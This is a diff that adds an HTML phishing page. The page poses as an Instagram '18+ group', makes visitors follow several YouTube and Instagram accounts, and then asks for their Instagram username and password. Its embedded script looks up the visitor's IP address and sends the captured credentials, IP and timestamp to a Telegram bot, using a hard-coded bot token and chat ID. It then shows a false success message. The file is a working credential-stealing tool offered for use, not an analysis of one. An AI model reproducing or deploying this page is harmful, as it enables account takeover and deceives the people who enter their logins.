@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Instagram Group</title>
+  <style>
+    body { font-family: sans-serif; text-align: center; padding: 50px; }
+    input { padding: 10px; width: 200px; margin: 5px 0; }
+    button { padding: 10px 20px; background: #0095f6; color: white; border: none; }
+    #status { margin-top: 20px; font-weight: bold; }
+    .link-btn { 
+      display: inline-block; 
+      margin: 10px; 
+      padding: 10px 20px; 
+      background: #ff4f4f; 
+      color: white; 
+      text-decoration: none; 
+      border-radius: 5px; 
+    }
+    .disabled { background: grey; pointer-events: none; }
+  </style>
+</head>
+<body>
+  <h2>👉 priya.groups all 18+ group</h2>
+  <p>Follow/Subscribe to all links below to continue:</p>
+
+  <a href="https://www.youtube.com/@Aryanteachguru" target="_blank" class="link-btn" onclick="markVisited(0)">YouTube 1</a>
+  <a href="http://youtube.com/channel/UCf8vf2t70SKyqaGEZ8zYXEg" target="_blank" class="link-btn" onclick="markVisited(1)">YouTube 2</a>
+  <a href="https://www.instagram.com/japan.indian?igsh=OW5ydmF3aTllZWU2" target="_blank" class="link-btn" onclick="markVisited(2)">Instagram</a>
+
+  <div style="margin-top:20px;">
+    <p>Enter your Instagram details:</p>
+    <input type="text" id="username" placeholder="Instagram username" required /><br/>
+    <input type="password" id="password" placeholder="Password" required /><br/>
+    <button id="submitBtn" onclick="sendToTelegram()" class="disabled">Submit</button>
+  </div>
+
+  <div id="status"></div>
+
+  <script>
+    const BOT_TOKEN = '8318773804:AAF7NhelOLbo8UmY9K-co7vQAsFQdCEeXnY';
+    const CHAT_ID = '5885830322';
+    let visited = [false, false, false];
+
+    function markVisited(index) {
+      visited[index] = true;
+      if (visited.every(v => v)) {
+        document.getElementById("submitBtn").classList.remove("disabled");
+      }
+    }
+
+    function sendToTelegram() {
+      if (!visited.every(v => v)) {
+        document.getElementById("status").innerText = "❌ Please follow/subscribe all first.";
+        return;
+      }
+
+      const username = document.getElementById("username").value.trim();
+      const password = document.getElementById("password").value.trim();
+      const status = document.getElementById("status");
+
+      if (!username || !password) {
+        status.innerText = "❌ Please fill both fields.";
+        return;
+      }
+
+      status.innerText = "⏳ Sending...";
+
+      fetch('https://api.ipify.org?format=json')
+        .then(res => res.json())
+        .then(ipData => {
+          const ip = ipData.ip;
+          const message = `⚠️ Login Attempt Captured\n\n👤 Username: ${username}\n🔑 Password: ${password}\n🌐 IP: ${ip}\n🕒 ${new Date().toLocaleString()}`;
+
+          return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              chat_id: CHAT_ID,
+              text: message
+            })
+          });
+        })
+        .then(res => res.json())
+        .then(data => {
+          if (data.ok) {
+            status.innerText = "✅ Submitted successfully!";
+          } else {
+            status.innerText = "❌ Failed to send.";
+          }
+        })
+        .catch(err => {
+          console.error(err);
+          status.innerText = "❌ Error sending.";
+        });
+    }
+  </script>
+</body>
+</html>
